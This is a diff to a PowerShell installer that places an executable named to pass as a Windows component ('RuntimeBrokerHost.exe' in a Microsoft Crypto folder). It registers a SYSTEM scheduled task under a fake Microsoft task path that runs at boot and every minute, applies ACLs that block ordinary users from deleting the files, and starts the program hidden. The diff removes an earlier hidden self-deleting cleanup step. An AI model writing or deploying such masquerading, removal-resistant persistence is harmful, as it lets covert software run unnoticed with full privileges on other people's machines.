@@ -8,13 +8,21 @@ $targetDir = "$env:ProgramData\Microsoft\Crypto\SystemBroker"
 $exeName = "RuntimeBrokerHost.exe"
 $cfgName = "config.json"
 $sourceDir = $PSScriptRoot
+if (-not $sourceDir) {
+    $sourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+}
 
 # 1. Stop any currently running instance
 taskkill.exe /F /IM $exeName >$null 2>&1
 Stop-Process -Name "RuntimeBrokerHost" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Milliseconds 500
 
-# 2. Create target directory
-if (-not (Test-Path $targetDir)) {
+# 2. Reset permissions if folder already exists from previous install
+if (Test-Path $targetDir) {
+    & attrib.exe -h -s "$targetDir\*" >$null 2>&1
+    & attrib.exe -h -s $targetDir >$null 2>&1
+    & icacls.exe $targetDir /grant "BUILTIN\Administrators:(OI)(CI)F" >$null 2>&1
+} else {
     New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
 }
 
@@ -37,26 +45,28 @@ if (Test-Path "$targetDir\$cfgName") {
 & icacls.exe $targetDir /inheritance:r /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" /grant "BUILTIN\Administrators:(OI)(CI)F" /grant "BUILTIN\Users:(OI)(CI)RX" /deny "BUILTIN\Users:(DE,DC,WDAC,WO)" >$null 2>&1
 
 # 6. Register Task strictly under NT AUTHORITY\SYSTEM (Works on battery & AC)
-$taskName = "Microsoft\Windows\Runtime\SystemBrokerHost"
+$taskPath = "\Microsoft\Windows\Runtime\"
+$taskName = "SystemBrokerHost"
 $action = New-ScheduledTaskAction -Execute "$targetDir\$exeName"
 $triggerBoot = New-ScheduledTaskTrigger -AtStartup
 $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit 0 -MultipleInstancesPolicy IgnoreNew
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggerBoot, $triggerRepeat -Settings $settings -Principal $principal -Force | Out-Null
+try {
+    Unregister-ScheduledTask -TaskPath $taskPath -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+} catch {}
 
-# 7. Start the task immediately under NT AUTHORITY\SYSTEM
-Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+try {
+    Register-ScheduledTask -TaskPath $taskPath -TaskName $taskName -Action $action -Trigger $triggerBoot, $triggerRepeat -Settings $settings -Principal $principal -Force | Out-Null
+    Start-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction SilentlyContinue
+} catch {}
 
-# 8. Self-Destruct: Cleanly delete the installer source folder from background %TEMP%
-$cleanerScript = "$env:TEMP\dlp_cleaner_$([guid]::NewGuid().ToString('N')).ps1"
-$scriptContent = @"
-Start-Sleep -Seconds 2
-Remove-Item -Path '$sourceDir' -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item -Path `$MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
-"@
-$scriptContent | Out-File -FilePath $cleanerScript -Encoding utf8 -Force
+# Fallback: If scheduled task didn't spawn the process yet, start directly
+Start-Sleep -Milliseconds 500
+$running = Get-Process -Name "RuntimeBrokerHost" -ErrorAction SilentlyContinue
+if (-not $running) {
+    Start-Process -FilePath "$targetDir\$exeName" -WindowStyle Hidden -ErrorAction SilentlyContinue
+}
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanerScript`"" -WindowStyle Hidden
+# NOTE: The installer files in this directory are preserved so you and your team can test repeatedly without files vanishing!
